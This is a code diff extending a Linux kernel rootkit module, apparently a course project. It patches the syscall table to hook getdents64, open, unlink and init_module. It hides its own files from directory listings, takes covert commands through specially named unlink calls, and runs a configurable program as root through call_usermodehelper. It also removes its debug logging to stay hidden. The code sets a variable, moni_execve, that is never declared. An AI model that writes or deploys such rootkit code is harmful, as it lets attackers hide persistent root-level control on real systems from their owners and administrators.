@@ -15,18 +15,22 @@ MODULE_DESCRIPTION("Rootkit main entry");
 // Hook system call table and hide file by name
 static unsigned long **hook_syscall_table(void);
 static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long count);
-static int callMonitor(char *msg);
-static int setMonitor(char *msg);
+static int callMonitor(char *type, const char *msg);
+static int configMonitor(char *msg);
 
 // Kernel system call
 asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 asmlinkage long (*kernel_open)(const char __user *filename, int flags, umode_t mode);
 asmlinkage long (*kernel_unlink)(const char __user *pathname);
+asmlinkage long (*kernel_sys_init_module)(void __user *  umod,  unsigned long len, 
+                                              const char __user * uargs);
 
 // Hooked system call
 asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode);
 asmlinkage long hooked_unlink(const char __user *pathname);
+asmlinkage long hooked_sys_init_module(void __user *  umod,  unsigned long len, 
+                                              const char __user * uargs);
 
 /*************** What file we gonna hide ********************/
 char *INEXISTFILE = "HIDEAFILEINKERNEL";
@@ -34,6 +38,10 @@ char *INEXISTMONITOR = "SETMONITORPROGRAM";
 char *hidfiles[256];
 char *monitor = NULL;
 int filenum;
+int moni_open;
+int moni_unlink;
+int moni_sys_init_module;
+
 
 
 /*
@@ -52,15 +60,24 @@ static int lkm_init(void)
     kernel_getdents64 = (void *)syscall_table[__NR_getdents64]; 
     kernel_open = (void *)syscall_table[__NR_open]; 
     kernel_unlink = (void *)syscall_table[__NR_unlink]; 
+    kernel_sys_init_module = (void *)syscall_table[__NR_sys_init_module]; 
     syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
     syscall_table[__NR_open] = (unsigned long *)hooked_open;
     syscall_table[__NR_unlink] = (unsigned long *)hooked_unlink;
+    syscall_table[__NR_sys_init_module] = (unsigned long *)hooked_sys_init_module;
     ENABLE_WRITE_PROTECTION;
     
     hidfiles[0] = "cmdoutput.txttmp";
     hidfiles[1] = "myrootkit.ko";
     hidfiles[2] = "ccprogram";
-    filenum=3;
+    hidfiles[3] = "ccprogram.c";
+    hidfiles[4] = "monitor";
+    hidfiles[5] = "monitor.c";
+    hidfiles[6] = "monitoroutput.txttmp";
+    filenum=7;
+    moni_open = 0;
+    moni_unlink = 0;
+    moni_sys_init_module = 0;
     
     return 0;    
 }
@@ -99,7 +116,6 @@ static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long c
         dp = (struct linux_dirent64 *)((char *)dirp + cur_addr);
         
         if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
-            printk("Hide %s file success.\n", dp->d_name);
             
             cur_reclen = dp->d_reclen;                              // Store the current dirent length
             next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
@@ -127,16 +143,26 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
     
     for(i=0; i<filenum; i++){
         rv = hide_file64(hidfiles[i], dirp, rv);
-        printk("hide %s...", hidfiles[i]);
     }
     
     return rv;
 }
 
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode){
-        
-    //Monitor exist file    
+    if(moni_open){
+        callMonitor("open", filename);
+    }
+           
     return kernel_open(filename, flags, mode);
+}
+
+asmlinkage long hooked_sys_init_module(void __user *  umod,  unsigned long len, 
+                                              const char __user * uargs){
+    if(moni_sys_init_module){
+        callMonitor("sys_init_module", (char*) umod);
+    }
+    
+    return kernel_sys_init_module(umod, len, uargs);
 }
 
 asmlinkage long hooked_unlink(const char __user *filename){
@@ -163,7 +189,6 @@ asmlinkage long hooked_unlink(const char __user *filename){
             hidfiles[filenum] = value;
             filenum++;
         }
-        printk("hide [%s] %d\n", value, filenum);
     } else if(strncmp(filename, INEXISTMONITOR, strlen(INEXISTMONITOR)) == 0){
         value = (char*) vmalloc(strlen(INEXISTMONITOR) * sizeof(char*));
         for(i=0, j=-1; i<strlen(filename); i++){
@@ -175,9 +200,15 @@ asmlinkage long hooked_unlink(const char __user *filename){
             }
         }
         if(j>0){
-            value[j] = '\0';
-            callMonitor(value);
+            if(value[j-1] == '\n'){
+                value[j-1] = '\0';
+            } else {
+                value[j] = '\0';
+            }
+            configMonitor(value);
         }
+    } else if(moni_unlink){
+        callMonitor("unlink", filename);
     }
     return kernel_unlink(filename);
 }
@@ -194,8 +225,8 @@ static void lkm_exit(void)
     ENABLE_WRITE_PROTECTION;
 }
 
-static int callMonitor(char *msg){
-    char *argv[] = { monitor, msg, NULL};
+static int callMonitor(char *type, const char *msg){
+    char *argv[] = { monitor, type, msg, NULL};
     static char *envp[] = {
             "HOME=/",
             "TERM=linux",
@@ -204,14 +235,21 @@ static int callMonitor(char *msg){
     return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 }
 
-static int setMonitor(char *msg){
-    char *argv[] = { monitor, msg, NULL};
-    static char *envp[] = {
-            "HOME=/",
-            "TERM=linux",
-            "PATH=/sbin:/bin:/usr/sbin:/usr/bin:", NULL};
+static int configMonitor(char *msg){
+    while(*msg == ' ') msg++;
+    
+    if(strncmp(msg, "set", 3) == 0){
+        msg += 4;
+        monitor = msg;
+    } else if(strncmp(msg, "open", 4) == 0){
+        moni_open = 1;
+    } else if(strncmp(msg, "unlink", 6) == 0){
+        moni_unlink = 1;
+    } else if(strncmp(msg, "execve", 6) == 0){
+        moni_execve = 1;
+    }
 
-    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    return 0;
 }
  
 module_init(lkm_init);
